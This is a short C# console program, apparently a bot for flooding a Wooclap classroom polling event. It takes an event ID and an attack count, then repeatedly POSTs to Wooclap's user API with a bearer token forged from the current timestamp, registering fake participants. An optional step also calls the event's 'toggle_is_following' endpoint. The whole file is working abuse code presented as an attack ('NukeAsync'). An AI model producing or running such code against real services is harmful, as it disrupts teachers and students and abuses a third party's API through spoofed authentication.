using System.Net;

namespace wooclap
{

    class wooclapBot
    {
        private static String WOOCLAP_ID;
        private static String NUMBER_ATTACK;
        private static String LOST;
        private static String THREAD;
        static async Task Main(String[] args)
        {
            Console.Write("WOOCLAP_ID ?\n> ");
            WOOCLAP_ID = Console.ReadLine();

            Console.Write("NUMBER_ATTACK ?\n> ");
            NUMBER_ATTACK = Console.ReadLine();

            Console.Write("LOST ? YES or NO\n> ");
            LOST = Console.ReadLine();

            Console.Write("HOW MANY THREAD ?\n>");
            THREAD = Console.ReadLine();

            if(THREAD == "") {await NukeAsync(); }

        }
        private static async Task NukeAsync()
        {
            for (int i = 0; i < int.Parse(NUMBER_ATTACK); i++)
            {
                String timeStamp = GetTimestamp(DateTime.Now);
                String url = "https://app.wooclap.com/api/user?slug=" + WOOCLAP_ID;

                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(url));
                req.Method = "POST";
                req.ContentType = "application/json";
                req.Headers.Add("authorization", "bearer z" + timeStamp);
                req.Accept = "Accept";

                WebResponse resp = await req.GetResponseAsync();
                Console.WriteLine("[ + ] #" + i + "  -> Success");
                if (LOST == "YES")
                {
                    String urllost = "https://app.wooclap.com/api/events/" + WOOCLAP_ID + "/toggle_is_following";
                    HttpWebRequest req0 = (HttpWebRequest)HttpWebRequest.Create(new Uri(urllost));
                    req0.Method = "POST";
                    req0.ContentType = "application/json";
                    req0.Headers.Add("authorization", "bearer z" + timeStamp);
                    req0.Accept = "Accept";
                    WebResponse resp0 = await req0.GetResponseAsync();
                    Console.WriteLine("[ + ] #" + i + "  -> NH Success");

                }
            }
        }

        public static String GetTimestamp(DateTime value)
        {
            return value.ToString("yyyyMMddHHmmssffff");
        }
    }
}